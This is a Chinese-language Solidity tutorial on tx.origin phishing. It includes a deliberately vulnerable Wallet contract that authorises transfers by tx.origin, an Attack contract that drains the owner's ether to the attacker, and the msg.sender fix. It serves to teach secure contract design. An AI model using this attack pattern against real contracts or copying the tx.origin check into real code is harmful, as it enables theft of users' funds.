# 使用 tx.origin 进行钓鱼

#### msg.sender和tx.origin之间的区别是什么？

如果合约A调用B，B又调用C，在C中`msg.sender`是B，而`tx.origin`是A。

## 漏洞

恶意合约可以欺骗合约的拥有者调用只有拥有者才能调用的函数。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
钱包是一个简单的合约，只有所有者才能将以太币转移到另一个地址。钱包的transfer()函数使用tx.origin来检查调用者是否为所有者。让我们看看如何攻破这个合约。
*/

/*
1. Alice部署了一个10以太币的Wallet合约
2. Eve部署了一个带有Alice的Wallet合约地址的Attack合约
3. Eve诱骗Alice调用Attack.attack()
4. Eve成功偷走了Alice钱包中的以太币

发生了什么？
Alice被诱骗调用了Attack.attack()。在Attack.attack()内部，它请求将Alice钱包中的所有资金转移到Eve的地址。由于Wallet.transfer()中的tx.origin等于Alice的地址，所以它授权了这次转账。钱包将所有以太币转移给了Eve。
*/

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint256 _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent,) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}

```

## 应对措施

使用`msg.sender`代替`tx.origin`

```solidity
function transfer(address payable _to, uint256 _amount) public {
  require(msg.sender == owner, "Not owner");

  (bool sent, ) = _to.call{ value: _amount }("");
  require(sent, "Failed to send Ether");
}
```

